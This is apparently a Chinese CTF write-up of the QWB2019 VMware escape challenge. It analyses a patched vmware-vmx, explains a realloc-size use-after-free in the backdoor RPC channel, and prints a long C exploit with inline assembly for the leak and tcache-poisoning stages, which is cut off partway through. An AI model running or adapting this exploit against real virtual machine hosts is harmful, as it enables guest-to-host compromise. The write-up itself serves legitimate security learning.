> 原文链接: https://www.anquanke.com//post/id/244454 


# QWB2019 VMw虚拟机逃逸wp


                                阅读量   
                                **125223**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p2.ssl.qhimg.com/t01bad206a46512f504.png)](https://p2.ssl.qhimg.com/t01bad206a46512f504.png)



## 0x00前言

​ 近期学习利用Vmware的backdoor机制进行虚拟机逃逸的攻击手法，借助RWCTF2018 station-excape的相关资料学习了解，以及在其exp的基础上进行调试修改，实现了QWB2019 VMw的虚拟机逃逸，第一次做这方面的工作，以此博客记录一下逆向、调试过程中的收获。<br>
​ 相关资料链接贴在前面：[r3kapig有关RWCTF2018 station-excape的详细wp](https://zhuanlan.zhihu.com/p/52140921)，其中也有关于backdoor机制的详细介绍，膜一波大佬们。



## 0x01题目分析

### <a class="reference-link" name="%E6%96%87%E4%BB%B6"></a>文件

​ 以我所了解到的，一般虚拟机逃逸类的题目都会给以个虚拟机环境（没错就是虚拟机套虚拟机），然后给一个patch过的组件，本题就是vmware-vmx-patched。<br>
​ 用010editor进行比对。比对结果如下。

[![](https://p1.ssl.qhimg.com/t01bbff22a0af96a83c.png)](https://p1.ssl.qhimg.com/t01bbff22a0af96a83c.png)

​ 发现patch后的组件与原版本的组件有三处区别。IDA打开后，跳转到三处地址查看改动。第一处改动将jz改为jmp无条件跳转。

[![](https://p5.ssl.qhimg.com/t019785eabb642f06b8.png)](https://p5.ssl.qhimg.com/t019785eabb642f06b8.png)

​ 第二处将跳转条件由ja改为jnb。即大于改为大于等于。

[![](https://p3.ssl.qhimg.com/t01aa6a6c9595a44d8e.png)](https://p3.ssl.qhimg.com/t01aa6a6c9595a44d8e.png)

​ 第三处将realloc传参时size由dword改为word，即四字节变为两字节。

[![](https://p3.ssl.qhimg.com/t01257c23e2a01dab5d.png)](https://p3.ssl.qhimg.com/t01257c23e2a01dab5d.png)

​ 分析到这里就感觉这是关键漏洞点了，realloc（ptr,size）函数当size为0时功能相当于free（ptr）。再看一下伪代码。

[![](https://p4.ssl.qhimg.com/t010ddde60ec337a6b5.png)](https://p4.ssl.qhimg.com/t010ddde60ec337a6b5.png)

​ 这段代码在处理 `Send_RPC_command_length` 过程中，在发送 `RPC_Command` 前会先发送 `RPC commad` 的长度，接收size值后，会先判断是否大于0x10000，然后判断是否大于RPCI结构体中记录的size，注意这些比较都时以四字节int的比较，但是在给 `realloc` 传参数的时候却以word，即两字节传入，会导致一个问题是，如果发送的size=0xffff，可以通过第一步size&lt;=0x10000检查，并且在 `realloc` 传参时，`LOWORD（v31）= (0xffff+1) &amp; 0xffff` ，即 `v31=0` 。

分析到这里，攻击思路如下，先`Send_RPC_command_length` 设置一个size，然后 `Send_RPC_command_length，size=0xffff` ，即将前面申请的堆块释放，并且指针残留在了RPCI结构体中，造成UAF的可能。

### <a class="reference-link" name="IDA%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90"></a>IDA静态分析

​ Vmx可执行文件中处理rpc指令的函数为下图函数，地址为0x189370

[![](https://p3.ssl.qhimg.com/t01e44b7dddb71d0f26.png)](https://p3.ssl.qhimg.com/t01e44b7dddb71d0f26.png)

​ 其中的符号为我手动添加。其中的getrpccap函数功能为获取rpc通信数据包，、根据参数不同获取rpc数据包中内容、大小等属性该函数共有六个case，与rpc六个指令一一对应：

#### <a class="reference-link" name="Case%200%EF%BC%8Copen%20channel%EF%BC%9A"></a>Case 0，open channel：

[![](https://p4.ssl.qhimg.com/t014f17b6d7af7ecf1d.png)](https://p4.ssl.qhimg.com/t014f17b6d7af7ecf1d.png)

该功能比较简短，读取了发来的rpc包里的magicnumber

[![](https://p1.ssl.qhimg.com/t0175befb84ba558ed3.png)](https://p1.ssl.qhimg.com/t0175befb84ba558ed3.png)

然后在后面进行了cookie的设置和时间的设置

[![](https://p2.ssl.qhimg.com/t01c8c3b1201215193f.png)](https://p2.ssl.qhimg.com/t01c8c3b1201215193f.png)

#### <a class="reference-link" name="Case%2001%20set%20len"></a>Case 01 set len

[![](https://p3.ssl.qhimg.com/t01b1ccd28ad4a4f5ac.png)](https://p3.ssl.qhimg.com/t01b1ccd28ad4a4f5ac.png)

[![](https://p2.ssl.qhimg.com/t01bdbb4b0b94f9563b.png)](https://p2.ssl.qhimg.com/t01bdbb4b0b94f9563b.png)

​ 该指令的内容部分对应的是长度，长度在接受包的时候就已经经过处理，如果超长会直接处理成-1，但后面也有个比较，推测这里是开发人员在扩展开发时未删减的部分。同时，在最开始会有个对fe9584处标志位的判断，推测为包内容错误的判断标志位，若内容接受出错则直接结束。下面有个对设置长度和现有长度的判断，若接受长度比现有长度小就会调用注册的函数表中错误处理的部分。比现有长度大则会进入空间扩展，会调用realloc进行堆操作,修改rpc结构中的数据缓冲区指针。

[![](https://p4.ssl.qhimg.com/t01a1da5993ac4ca7ef.png)](https://p4.ssl.qhimg.com/t01a1da5993ac4ca7ef.png)

[![](https://p5.ssl.qhimg.com/t0197d4d95db3fe9a1a.png)](https://p5.ssl.qhimg.com/t0197d4d95db3fe9a1a.png)

#### <a class="reference-link" name="Case%2002%20send%20data"></a>Case 02 send data

[![](https://p1.ssl.qhimg.com/t01786b4e706e59de8a.png)](https://p1.ssl.qhimg.com/t01786b4e706e59de8a.png)

​ 该case开头先调用函数获取了命令包的内容，v21参数里面存的就是发送的内容，内容一次最多四字节，v22里面是打开的channel的命令数据缓冲区，后面会判断chanell的状态，如果不是待读取状态是不会开始读取的。读取时会根据发送时指定的长度来进行复制。

[![](https://p3.ssl.qhimg.com/t01633b74b109a350d5.png)](https://p3.ssl.qhimg.com/t01633b74b109a350d5.png)

[![](https://p2.ssl.qhimg.com/t015bf4053fe553c883.png)](https://p2.ssl.qhimg.com/t015bf4053fe553c883.png)

​ 可以看到把我们发送的四个字节指令（在rbp中）复制到了rdx指向的地址中

​ 复制完后会把rpc结构体的一个代表未接收长度的属性减去接收的值，如果已经接收完了，会根据一个类似虚表的东西来调用对应的命令处理函数，然后把rpc状态修改为1。

[![](https://p1.ssl.qhimg.com/t01b95e705716203211.png)](https://p1.ssl.qhimg.com/t01b95e705716203211.png)

[![](https://p5.ssl.qhimg.com/t018caaaa4efa1877cf.png)](https://p5.ssl.qhimg.com/t018caaaa4efa1877cf.png)

​ 该函数的参数为指令本身以及指令长度，寻址方式为将命令与存在表中的字符串比较，找到对应的处理函数，调用以进行处理

安装函数的函数为下面这个，地址为0x114866

[![](https://p2.ssl.qhimg.com/t01b4cd8d924edd8c38.png)](https://p2.ssl.qhimg.com/t01b4cd8d924edd8c38.png)

[![](https://p5.ssl.qhimg.com/t016c73a52fccfa3710.png)](https://p5.ssl.qhimg.com/t016c73a52fccfa3710.png)

​ 存储字符串指针的表位置为0x111df80,存储函数的位置也在附近，不过寻址方式不太一样。存储区域比较大。在执行指令时，会申请一个0x20大小的堆

[![](https://p2.ssl.qhimg.com/t0170c39d4d1d57546d.png)](https://p2.ssl.qhimg.com/t0170c39d4d1d57546d.png)

​ 寻址函数地址为0x177d61

#### <a class="reference-link" name="Case%2003%20reply%20length"></a>Case 03 reply length

​ 该case 功能为发送给客户机返回数据的长度

[![](https://p4.ssl.qhimg.com/t016f83e6f0f7d1b697.png)](https://p4.ssl.qhimg.com/t016f83e6f0f7d1b697.png)

​ 功能也比较简单，得到对应channel 的执政，判断是否为接受完数据的状态，然后设置发送长度和发送数据缓冲区

#### <a class="reference-link" name="Case%2004%20reply%20data"></a>Case 04 reply data

​ 这个功能为发送执行指令后的返回数据

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0104f2efba4f06f9bb.png)

​ 开头也是获得channel指针，然后设置channel的发送缓冲区和发送长度，一次同样只能发送四字节，如果最后不够就会发送剩余长度的数据

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0186d13d7c127f79c3.png)

​ 最后会把rpc的状态修改为发送完毕

#### <a class="reference-link" name="Case%2005%20finish%20receive%20reply"></a>Case 05 finish receive reply

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0144fd60887840b4db.png)

​ 该功能为结束接受返回信息。读取rpc指针，判断是否为发送完毕状态，然后会设置状态为1，完成状态闭环，出错的时候会有错误处理，输出错误提示

#### <a class="reference-link" name="Case%2006%20close%20channel"></a>Case 06 close channel

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t011672449a781f55c2.png)

​ 该功能为关闭channel，获取rpc指针后判断其数据区指针是否为空，为空说明它非开启状态，不为空就调用函数进行关闭处理。

#### <a class="reference-link" name="%E5%B0%8F%E7%BB%93"></a>小结

​ 这部分分析是为了理清backdoor机制中host与guest的交互机制，尤其是涉及到内存分配与回收操作的部分，以及patch部分代码要尤其关注，漏洞点一定是在patch代码附近，以本样本为例，主要部分为 `case 01 set len` ,尤其注意 `realoc（）` 函数。



## 0x02 EXP编写

### <a class="reference-link" name="leak"></a>leak

​ 经过静态分析和调试的验证，仿照[Real World CTF 2018 Finals Station-Escape](https://zhuanlan.zhihu.com/p/52140921)的思路编写EXP。

​ 首先分析本次逃逸的漏洞点与先前的区别，Rwctf的逃逸样本UAF发生在output申请到的堆块，即info-set guestinfo.a xxx，在调用info-get是会申请对应xxx大小的堆块作为缓冲区存放xxx内容，而QWB的逃逸样本漏洞点出在Send RPC command length中申请的堆块。

​ 所以leak基地址思路与rwctf类似。使用run_cmd（info-set guestinfo.a xxx），预设一个0x100的guestinfo.a。

[![](https://p5.ssl.qhimg.com/t017d5229a47fea70fd.png)](https://p5.ssl.qhimg.com/t017d5229a47fea70fd.png)

​ 打开一个channel_0，先通过Send RPC command length申请一个0x100大小的堆块。

[![](https://p4.ssl.qhimg.com/t01d5e7cab643ea776f.png)](https://p4.ssl.qhimg.com/t01d5e7cab643ea776f.png)

​ 然后打开channel_1，发送info-get guestinfo.a 命令，这里有一个小tip，Send RPC command data 时每次发送四个字节，并且在接收完完整的command后才会执行命令，为了防止Send RPC command data 的过程中有其他堆操作影响漏洞利用，先send command的前strlen（command）- 4个字节，然后channel_0发送Send RPC command length，设置size为0xffff，释放掉channel_0中申请的0x100堆块到tcache[0x110]的头。

[![](https://p3.ssl.qhimg.com/t016085794417a795c2.png)](https://p3.ssl.qhimg.com/t016085794417a795c2.png)

​ 发送完info-get guestinfo.a 命令后，会malloc(strlen(guestinfo.a))，作为output缓冲区，因为此时tcache[0x110]头是我们刚刚释放的channel_0的command块，会将该块分配出来作为输出缓冲区，但是 `channel_0_struct_RPCI-&gt;heap_ptr` 中仍保存了堆指针，此时 `guestinfo.a = channel_0_struct_RPCI-&gt;heap_ptr`。

​ 然后下一步就是与rwctf相同的思路，再次释放该堆块到tcache[0x110]头，利用 `vmx.capability.dnd_version` ，将obj申请到guestinfo.a的output缓冲区，利用obj中的vtable泄露testbase。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01ac3c87b2098a2551.png)

### <a class="reference-link" name="exploit"></a>exploit

​ 利用过程同样类似，打开channel_0的用来申请一个size0的堆块，释放后用channel_1申请回来，然后channel_0再次释放，造成UAF，利用channel_1来写入数据，修改tcache的fd，造成任意地址写，channel_2申请一次，channel_3申请到伪造fd处。

​ 那么如何伪造fd。调试中发现，在 后，会 `call [r8+rax*1+0x8]` ，并且第一个参数 `rdi = [rdi+rax]` 。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0109566bd86a073154.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t014e0e1cf92168f62d.png)

Rdi与r8寄存器中地址相近，rax=0，那么如果将fd伪造到r8处，在r8+8处写入system地址，rdi处写入 `gnome-calculator\x00` 即可弹出计算器。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01b1eb1d7cb1667615.png)

最后效果演示：（妈妈我也会弹计算器了！）

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0161206822f4aab9fb.png)



## 完整exp

```
#include &lt;stdio.h&gt;
#include &lt;stdint.h&gt;
void channel_open(int *cookie1,int *cookie2,int *channel_num,int *res)`{`
    asm("movl %%eax,%%ebx\n\t"
        "movq %%rdi,%%r10\n\t"
        "movq %%rsi,%%r11\n\t"
        "movq %%rdx,%%r12\n\t"
        "movq %%rcx,%%r13\n\t"
        "movl $0x564d5868,%%eax\n\t"
        "movl $0x49435052,%%ebx\n\t"
        "movl $0x1e,%%ecx\n\t"
        "movl $0x5658,%%edx\n\t"
        "out %%eax,%%dx\n\t"
        "movl %%edi,(%%r10)\n\t"
        "movl %%esi,(%%r11)\n\t"
        "movl %%edx,(%%r12)\n\t"
        "movl %%ecx,(%%r13)\n\t"
        :
        :
        :"%rax","%rbx","%rcx","%rdx","%rsi","%rdi","%r8","%r10","%r11","%r12","%r13"
       );
`}`

void channel_set_len(int cookie1,int cookie2,int channel_num,int len,int *res)`{`
    asm("movl %%eax,%%ebx\n\t"
        "movq %%r8,%%r10\n\t"
        "movl %%ecx,%%ebx\n\t"
        "movl $0x564d5868,%%eax\n\t"
        "movl $0x0001001e,%%ecx\n\t"
        "movw $0x5658,%%dx\n\t"
        "out %%eax,%%dx\n\t"
        "movl %%ecx,(%%r10)\n\t"
        :
        :
        :"%rax","%rbx","%rcx","%rdx","%rsi","%rdi","%r10"
       );
`}`

void channel_send_data(int cookie1,int cookie2,int channel_num,int len,char *data,int *res)`{`
    asm("pushq %%rbp\n\t"
        "movq %%r9,%%r10\n\t"
        "movq %%r8,%%rbp\n\t"
        "movq %%rcx,%%r11\n\t"
        "movq $0,%%r12\n\t"
        "1:\n\t"
        "movq %%r8,%%rbp\n\t"
        "add %%r12,%%rbp\n\t"
        "movl (%%rbp),%%ebx\n\t"
        "movl $0x564d5868,%%eax\n\t"
        "movl $0x0002001e,%%ecx\n\t"
        "movw $0x5658,%%dx\n\t"
        "out %%eax,%%dx\n\t"
        "addq $4,%%r12\n\t"
        "cmpq %%r12,%%r11\n\t"
        "ja 1b\n\t"
        "movl %%ecx,(%%r10)\n\t"
        "popq %%rbp\n\t"
        :
        :
        :"%rax","%rbx","%rcx","%rdx","%rsi","%rdi","%r10","%r11","%r12"
        );
`}`

void channel_recv_reply_len(int cookie1,int cookie2,int channel_num,int *len,int *res)`{`
    asm("movl %%eax,%%ebx\n\t"
        "movq %%r8,%%r10\n\t"
        "movq %%rcx,%%r11\n\t"
        "movl $0x564d5868,%%eax\n\t"
        "movl $0x0003001e,%%ecx\n\t"
        "movw $0x5658,%%dx\n\t"
        "out %%eax,%%dx\n\t"
        "movl %%ecx,(%%r10)\n\t"
        "movl %%ebx,(%%r11)\n\t"
        :
        :
        :"%rax","%rbx","%rcx","%rdx","%rsi","%rdi","%r10","%r11"
       );

`}`

void channel_recv_data(int cookie1,int cookie2,int channel_num,int offset,char *data,int *res)`{`
    asm("pushq %%rbp\n\t"
        "movq %%r9,%%r10\n\t"
        "movq %%r8,%%rbp\n\t"
        "movq %%rcx,%%r11\n\t"
        "movq $1,%%rbx\n\t"
        "movl $0x564d5868,%%eax\n\t"
        "movl $0x0004001e,%%ecx\n\t"
        "movw $0x5658,%%dx\n\t"
        "in %%dx,%%eax\n\t"
        "add %%r11,%%rbp\n\t"
        "movl %%ebx,(%%rbp)\n\t"
        "movl %%ecx,(%%r10)\n\t"
        "popq %%rbp\n\t"
        :
        :
        :"%rax","%rbx","%rcx","%rdx","%rsi","%rdi","%r10","%r11","%r12"
       );
`}`

void channel_recv_finish(int cookie1,int cookie2,int channel_num,int *res)`{`
    asm("movl %%eax,%%ebx\n\t"
        "movq %%rcx,%%r10\n\t"
        "movq $0x1,%%rbx\n\t"
        "movl $0x564d5868,%%eax\n\t"
        "movl $0x0005001e,%%ecx\n\t"
        "movw $0x5658,%%dx\n\t"
        "out %%eax,%%dx\n\t"
        "movl %%ecx,(%%r10)\n\t"
        :
        :
        :"%rax","%rbx","%rcx","%rdx","%rsi","%rdi","%r10"
       );
`}`
void channel_recv_finish2(int cookie1,int cookie2,int channel_num,int *res)`{`
    asm("movl %%eax,%%ebx\n\t"
        "movq %%rcx,%%r10\n\t"
        "movq $0x21,%%rbx\n\t"
        "movl $0x564d5868,%%eax\n\t"
        "movl $0x0005001e,%%ecx\n\t"
        "movw $0x5658,%%dx\n\t"
        "out %%eax,%%dx\n\t"
        "movl %%ecx,(%%r10)\n\t"
        :
        :
        :"%rax","%rbx","%rcx","%rdx","%rsi","%rdi","%r10"
       );
`}`
void channel_close(int cookie1,int cookie2,int channel_num,int *res)`{`
    asm("movl %%eax,%%ebx\n\t"
        "movq %%rcx,%%r10\n\t"
        "movl $0x564d5868,%%eax\n\t"
        "movl $0x0006001e,%%ecx\n\t"
        "movw $0x5658,%%dx\n\t"
        "out %%eax,%%dx\n\t"
        "movl %%ecx,(%%r10)\n\t"
        :
        :
        :"%rax","%rbx","%rcx","%rdx","%rsi","%rdi","%r10"
       );
`}`
struct channel`{`
    int cookie1;
    int cookie2;
    int num;
`}`;
uint64_t heap =0;
uint64_t text =0;
void run_cmd(char *cmd)`{`
    struct channel tmp;
    int res,len,i;
    char *data;
    channel_open(&amp;tmp.cookie1,&amp;tmp.cookie2,&amp;tmp.num,&amp;res);
    if(!res)`{`
        printf("fail to open channel!\n");
        return;
    `}`
    channel_set_len(tmp.cookie1,tmp.cookie2,tmp.num,strlen(cmd),&amp;res);
    if(!res)`{`
        printf("fail to set len\n");
        return;
    `}`
    channel_send_data(tmp.cookie1,tmp.cookie2,tmp.num,strlen(cmd)+0x10,cmd,&amp;res);

    channel_recv_reply_len(tmp.cookie1,tmp.cookie2,tmp.num,&amp;len,&amp;res);
    if(!res)`{`
        printf("fail to recv data len\n");
        return;
    `}`
    printf("recv len:%d\n",len);
    data = malloc(len+0x10);
    memset(data,0,len+0x10);
    for(i=0;i&lt;len+0x10;i+=4)`{`
        channel_recv_data(tmp.cookie1,tmp.cookie2,tmp.num,i,data,&amp;res);
    `}`
    printf("recv data:%s\n",data);
    channel_recv_finish(tmp.cookie1,tmp.cookie2,tmp.num,&amp;res);
    if(!res)`{`
        printf("fail to recv finish\n");
    `}`

    channel_close(tmp.cookie1,tmp.cookie2,tmp.num,&amp;res);
    if(!res)`{`
        printf("fail to close channel\n");
        return;
    `}`
`}`
void leak()`{`
    struct channel chan[10];
    int res=0;
    int len,i;    
    char pay[8192];
    char *s1 = "info-set guestinfo.a AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
    char *data;
    char *s2 = "info-get guestinfo.a";
    char *s21= "info-get guestinfo.a AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
    char *s3 = "1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
    char *s4 = "tools.capability.dnd_version 4";
    char *s5 = "vmx.capability.dnd_version";
    //init data
    run_cmd(s1); // set the message len to be 0x100, so when we call info-get ,we will call malloc(0x100);
    run_cmd(s4);


    //first step 
    channel_open(&amp;chan[0].cookie1,&amp;chan[0].cookie2,&amp;chan[0].num,&amp;res);
    if(!res)`{`
        printf("fail to open channel!\n");
        return;
    `}`
    channel_set_len(chan[0].cookie1,chan[0].cookie2,chan[0].num,strlen(s21),&amp;res);//strlen(s21) = 0x100
    if(!res)`{`
        printf("fail to set len\n");
        return;
    `}`
    channel_send_data(chan[0].cookie1,chan[0].cookie2,chan[0].num,strlen(s21),s2,&amp;res);
    channel_recv_reply_len(chan[0].cookie1,chan[0].cookie2,chan[0].num,&amp;len,&amp;res);
    if(!res)`{`
        printf("fail to recv data len\n");
        return;
    `}`
    printf("recv len:%d\n",len);
    data = malloc(len+0x10);
    memset(data,0,len+0x10);
    for(i=0;i&lt;len+0x10;i++)`{`
        channel_recv_data(chan[0].cookie1,chan[0].cookie2,chan[0].num,i,data,&amp;res);
    `}`
    printf("recv data:%s\n",data);
    //second step free the reply and let the other channel get it.

    channel_open(&amp;chan[1].cookie1,&amp;chan[1].cookie2,&amp;chan[1].num,&amp;res);
    if(!res)`{`
        printf("fail to open channel!\n");
        return;
    `}`
    channel_set_len(chan[1].cookie1,chan[1].cookie2,chan[1].num,strlen(s2),&amp;res);
    if(!res)`{`
        printf("fail to set len\n");
        return;
    `}`

    channel_send_data(chan[1].cookie1,chan[1].cookie2,chan[1].num,strlen(s2)-4,s2,&amp;res);
    if(!res)`{`
        printf("fail to send data\n");
        return;
    `}`

    //free the output buffer
    printf("Freeing the buffer....,bp:0x5555556DD3EF\n");
    getchar();
    channel_set_len(chan[0].cookie1,chan[0].cookie2,chan[0].num,0xffff,&amp;res);
    if(!res)`{`
        printf("fail to recv finish1\n");
        return;
    `}`
    //finished sending the command, should get the freed buffer
    printf("Finishing sending the buffer , should allocate the buffer..,bp:0x5555556DD5BC\n");
    channel_send_data(chan[1].cookie1,chan[1].cookie2,chan[1].num,4,&amp;s2[16],&amp;res);
    if(!res)`{`
        printf("fail to send data\n");
        return;
    `}`

    //third step,free it again
    //set status to be 4


    //free the output buffer
    printf("Free the buffer again...\n");
    getchar();
    channel_set_len(chan[0].cookie1,chan[0].cookie2,chan[0].num,0xffff,&amp;res);

    if(!res)`{`
        printf("fail to recv finish2\n");
        return;
    `}`

    printf("Trying to reuse the buffer as a struct, which we can leak..\n");
    getchar();
    run_cmd(s5);
    printf("Should be done.Check the buffer\n");
    getchar();

    //Now the output buffer of chan[1] is used as a struct, which contains many addresses
    channel_recv_reply_len(chan[1].cookie1,chan[1].cookie2,chan[1].num,&amp;len,&amp;res);
    if(!res)`{`
        printf("fail to recv data len\n");
        return;
    `}`


    data = malloc(len+0x10);
    memset(data,0,len+0x10);
    for(i=0;i&lt;len+0x10;i+=4)`{`
        channel_recv_data(chan[1].cookie1,chan[1].cookie2,chan[1].num,i,data,&amp;res);
    `}`
    printf("recv data:\n");
    for(i=0;i&lt;len;i+=8)`{`
        printf("recv data:%lx\n",*(long long *)&amp;data[i]);
    `}`
    text = (*(uint64_t *)data)-0xf818d0;
    channel_recv_finish(chan[0].cookie1,chan[0].cookie2,chan[0].num,&amp;res);
    printf("Leak Success\n");
`}`

void exploit()`{`
    //the exploit step is almost the same as the leak ones
    struct channel chan[10];
    int res=0;
    int len,i;
    char *data;
    char *s1 = "info-set guestinfo.b BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB";
    char *s2 = "info-get guestinfo.b";
    char *s3 = "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB";
    char *s4 = "gnome-calculator\x00";
    uint64_t pay1 =text+0xFE95B8; 
    uint64_t pay2 =text+0xECFE0; //system
    uint64_t pay3 =text+0xFE95C8;
    char *pay4 = "gnome-calculator\x00";
    //run_cmd(s1);
    channel_open(&amp;chan[0].cookie1,&amp;chan[0].cookie2,&amp;chan[0].num,&amp;res);
    if(!res)`{`
        printf("fail to open channel!\n");
        return;
    `}`
    channel_set_len(chan[0].cookie1,chan[0].cookie2,chan[0].num,strlen(s1),&amp;res);
    if(!res)`{`
        printf("fail to set len\n");
        return;
    `}`
    channel_send_data(chan[0].cookie1,chan[0].cookie2,chan[0].num,strlen(s1),s1,&amp;res);
    channel_recv_reply_len(chan[0].cookie1,chan[0].cookie2,chan[0].num,&amp;len,&amp;res);
    if(!res)`{`
        printf("fail to recv data len\n");
        return;
    `}`
    printf("recv len:%d\n",len);
    data = malloc(len+0x10);
    memset(data,0,len+0x10);
    for(i=0;i&lt;len+0x10;i+=4)`{`
        channel_recv_data(chan[0].cookie1,chan[0].cookie2,chan[0].num,i,data,&amp;res);
    `}`
    printf("recv data:%s\n",data);
    channel_open(&amp;chan[1].cookie1,&amp;chan[1].cookie2,&amp;chan[1].num,&amp;res);
    if(!res)`{`
        printf("fail to open channel!\n");
        return;
    `}`
    channel_open(&amp;chan[2].cookie1,&amp;chan[2].cookie2,&amp;chan[2].num,&amp;res);
    if(!res)`{`
        printf("fail to open channel!\n");
        return;
    `}`
    channel_open(&amp;chan[3].cookie1,&amp;chan[3].cookie2,&amp;chan[3].num,&amp;res);
    if(!res)`{`
        printf("fail to open channel!\n");
        return;
    `}`
    //channel_recv_finish2(chan[0].cookie1,chan[0].cookie2,chan[0].num,&amp;res);
    channel_set_len(chan[0].cookie1,chan[0].cookie2,chan[0].num,0xffff,&amp;res);
    if(!res)`{`
        printf("fail to recv finish2\n");
        return;
    `}`
    channel_set_len(chan[1].cookie1,chan[1].cookie2,chan[1].num,strlen(s3),&amp;res);
    if(!res)`{`
        printf("fail to set len\n");
        return;
    `}`
